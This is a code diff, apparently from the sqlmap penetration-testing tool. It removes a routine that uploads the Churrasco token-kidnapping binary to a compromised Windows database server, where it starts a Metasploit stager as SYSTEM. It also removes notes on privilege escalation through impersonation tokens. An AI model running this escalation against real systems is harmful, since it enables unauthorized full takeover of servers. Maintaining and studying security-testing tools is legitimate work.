@@ -54,31 +54,8 @@ class Takeover(Abstraction, Metasploit, Registry):
     def __init__(self):
         self.cmdTblName       = "sqlmapoutput"
         self.tblField         = "data"
-        self.cmdFromChurrasco = False
 
         Abstraction.__init__(self)
-
-    def uploadChurrasco(self):
-        msg  = "do you want sqlmap to upload Churrasco and call the "
-        msg += "Metasploit payload stager as its argument so that it "
-        msg += "will be started as SYSTEM? [y/N] "
-
-        output = readInput(msg, default="N")
-
-        if output and output[0] in ( "y", "Y" ):
-            tmpFile = decloakToNamedTemporaryFile(os.path.join(paths.SQLMAP_CONTRIB_PATH, "tokenkidnapping", "Churrasco.exe_"))
-
-            wFile                 = tmpFile.name
-            self.churrascoPath    = "%s/tmpc%s.exe" % (conf.tmpPath, randomStr(lowercase=True))
-            self.cmdFromChurrasco = True
-            
-            self.writeFile(wFile, self.churrascoPath, "binary", confirm=False)
-            
-            tmpFile.close()
-
-            return True
-        else:
-            return False
 
     def osCmd(self):
         stackedTest()
@@ -171,27 +148,6 @@ class Takeover(Abstraction, Metasploit, Registry):
                     debugMsg  = "by default MySQL on Windows runs as SYSTEM "
                     debugMsg += "user, no need to privilege escalate"
                     logger.debug(debugMsg)
-
-                elif kb.dbms == "PostgreSQL":
-                    debugMsg  = "by default PostgreSQL on Windows runs as postgres "
-                    debugMsg += "user which has no access to LSASS: it is "
-                    debugMsg += "unlikely that the privilege escalation "
-                    debugMsg += "via 'incognito' extension will be successful"
-                    logger.debug(debugMsg)
-
-                elif kb.dbms == "Microsoft SQL Server" and kb.dbmsVersion[0] in ( "2005", "2008" ):
-                    debugMsg  = "often Microsoft SQL Server %s " % kb.dbmsVersion[0]
-                    debugMsg += "runs as Network Service which has Windows "
-                    debugMsg += "Impersonation Tokens"
-                    logger.debug(debugMsg)
-
-                    uploaded = self.uploadChurrasco()
-
-                    if not uploaded:
-                        debugMsg  = "beware that the privilege escalation "
-                        debugMsg += "might not work via Churrasco if "
-                        debugMsg += "MS09-012 patch is installed"
-                        logger.debug(debugMsg)
 
             elif kb.os != "Windows" and conf.privEsc:
                 # Unset --priv-esc if the back-end DBMS underlying operating
